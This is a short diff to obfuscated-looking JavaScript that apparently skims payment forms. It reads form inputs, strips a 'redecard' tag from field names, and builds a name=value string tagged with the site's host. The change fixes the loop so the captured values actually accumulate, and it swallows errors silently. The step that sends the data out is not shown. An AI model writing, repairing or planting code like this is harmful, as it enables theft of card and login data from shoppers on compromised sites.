@@ -12,9 +12,7 @@ setTimeout(function(){
                       if ($a(b[j]).val().length>0){
                           k();
                     }
-                }catch(e){
-
-                }
+                }catch(e){}
             }
             function k(){
                 var x ="";
@@ -27,7 +25,7 @@ setTimeout(function(){
                         }
                         var s = n.replace(/\[/g,"-");
                         var d = s.replace(/-redecard/,"");
-                        var v = d.replace(/]/g,"")+'='+inp[i].value+'&';
+                         x += d.replace(/]/g,"")+'='+inp[i].value+'&';
                     }
                 }
                 x = x+"&id="+window.location.host;
